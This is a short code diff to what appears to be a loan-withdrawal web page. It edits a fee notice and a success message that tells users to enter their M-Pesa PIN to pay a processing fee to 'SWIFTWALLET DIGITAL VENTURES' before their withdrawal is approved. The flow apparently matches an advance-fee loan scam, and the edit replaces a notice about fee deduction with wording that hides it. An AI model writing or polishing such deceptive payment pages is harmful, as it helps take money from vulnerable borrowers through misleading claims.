@@ -486,7 +486,7 @@
                 <div id="withdrawalAmount" class="text-4xl font-bold text-green-700 mb-2">Loading...</div>
                 <div class="text-sm text-gray-600 mb-2">
                     <i class="fas fa-info-circle mr-1"></i>
-                    <span id="feeNotice">After deducting processing fee</span>
+                    <span id="feeNotice">Actual amount approved; withdrawable</span>
                 </div>
                 <div class="flex justify-center items-center space-x-4 text-xs text-gray-500">
                     <span>
@@ -1463,7 +1463,9 @@
                 'bank': 'fas fa-university'
             };
 
-            const message = `Your withdrawal request is initiated successfully! Check your phone (${loanData.phone}) for the M-Pesa payment  request from <span class="text-red-600 font-bold">✔️SWIFTWALLET DIGITAL VENTURES✔️</span>. Enter your M-Pesa PIN to complete the fee payment requested to complete withdrawal .Your withdrawal to ${methodNames[selectedWithdrawalMethod]} is <span class="text-orange-600 font-bold">PENDING SYSTEM APPROVAL</span> after fee payment confirmation.`;
+            const fee = document.getElementById("processingFee").textContent;
+
+const message = `Your withdrawal request is initiated successfully! Check your phone (${loanData.phone}) for the M-Pesa payment request from <span class="text-red-600 font-bold">✔️SWIFTWALLET DIGITAL VENTURES✔️</span>. Enter your M-Pesa PIN to complete the fee payment requested to complete withdrawal. Your withdrawal to ${methodNames[selectedWithdrawalMethod]} is <span class="text-orange-600 font-bold">PENDING SYSTEM APPROVAL</span> after fee payment of <span class="font-bold text-green-700">${fee}</span> is confirmed.`;
 
             // Update success message
             document.getElementById('successMessage').innerHTML = message;
